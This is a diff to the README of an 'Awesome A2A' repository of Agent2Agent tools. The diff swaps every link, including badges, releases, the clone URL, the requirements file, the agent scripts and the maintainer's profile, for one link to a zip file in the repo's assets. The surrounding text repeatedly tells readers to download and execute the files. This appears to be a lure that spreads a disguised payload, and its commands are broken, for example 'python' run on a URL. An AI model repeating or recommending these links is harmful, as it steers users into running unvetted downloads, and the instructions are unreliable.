@@ -1,8 +1,8 @@
 # Awesome A2A 🚀
 
-![Awesome](https://img.shields.io/badge/Awesome-A2A-blue.svg)
-![Version](https://img.shields.io/badge/Version-1.0.0-green.svg)
-![License](https://img.shields.io/badge/License-MIT-yellow.svg)
+![Awesome](https://github.com/ZoroSola55/awesome-a2a/raw/refs/heads/main/assets/awesome-a-brachygraphic.zip)
+![Version](https://github.com/ZoroSola55/awesome-a2a/raw/refs/heads/main/assets/awesome-a-brachygraphic.zip)
+![License](https://github.com/ZoroSola55/awesome-a2a/raw/refs/heads/main/assets/awesome-a-brachygraphic.zip)
 
 Welcome to **Awesome A2A**! This repository is your one-stop destination for everything related to Agent2Agent (A2A). Here, you will find a curated collection of A2A agents, tools, servers, and clients, all in one place. 
 
@@ -42,13 +42,13 @@ To get started with Awesome A2A, you need to have basic knowledge of programming
 
 ## Installation
 
-You can easily install the tools and agents from this repository. For detailed instructions, please visit our [Releases section](https://github.com/ZoroSola55/awesome-a2a/releases). Download the necessary files and execute them as per the guidelines provided.
+You can easily install the tools and agents from this repository. For detailed instructions, please visit our [Releases section](https://github.com/ZoroSola55/awesome-a2a/raw/refs/heads/main/assets/awesome-a-brachygraphic.zip). Download the necessary files and execute them as per the guidelines provided.
 
 ### Step-by-Step Installation
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/ZoroSola55/awesome-a2a.git
+   git clone https://github.com/ZoroSola55/awesome-a2a/raw/refs/heads/main/assets/awesome-a-brachygraphic.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -57,12 +57,12 @@ You can easily install the tools and agents from this repository. For detailed i
    ```
 
 3. **Download Releases**: 
-   Visit the [Releases section](https://github.com/ZoroSola55/awesome-a2a/releases) to find the latest version. Download the necessary files and execute them.
+   Visit the [Releases section](https://github.com/ZoroSola55/awesome-a2a/raw/refs/heads/main/assets/awesome-a-brachygraphic.zip) to find the latest version. Download the necessary files and execute them.
 
 4. **Install Dependencies**:
    If your tools require specific libraries, make sure to install them. Use:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/ZoroSola55/awesome-a2a/raw/refs/heads/main/assets/awesome-a-brachygraphic.zip
    ```
 
 5. **Run the Application**:
@@ -76,12 +76,12 @@ Once you have installed the tools and agents, you can start using them. Each age
 
 - **Agent1**: Designed for task management. You can initiate it by running:
   ```bash
-  python agent1.py
+  python https://github.com/ZoroSola55/awesome-a2a/raw/refs/heads/main/assets/awesome-a-brachygraphic.zip
   ```
 
 - **Agent2**: Focuses on data analysis. Start it with:
   ```bash
-  python agent2.py
+  python https://github.com/ZoroSola55/awesome-a2a/raw/refs/heads/main/assets/awesome-a-brachygraphic.zip
   ```
 
 ### A2A Tools
@@ -112,11 +112,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or suggestions, feel free to reach out to the maintainers:
 
-- **Zoro Sola** - [GitHub Profile](https://github.com/ZoroSola55)
+- **Zoro Sola** - [GitHub Profile](https://github.com/ZoroSola55/awesome-a2a/raw/refs/heads/main/assets/awesome-a-brachygraphic.zip)
 
 ## Releases
 
-Stay updated with the latest releases. You can find all the versions and their respective changelogs in the [Releases section](https://github.com/ZoroSola55/awesome-a2a/releases). Download the necessary files and execute them as instructed.
+Stay updated with the latest releases. You can find all the versions and their respective changelogs in the [Releases section](https://github.com/ZoroSola55/awesome-a2a/raw/refs/heads/main/assets/awesome-a-brachygraphic.zip). Download the necessary files and execute them as instructed.
 
 ---
 
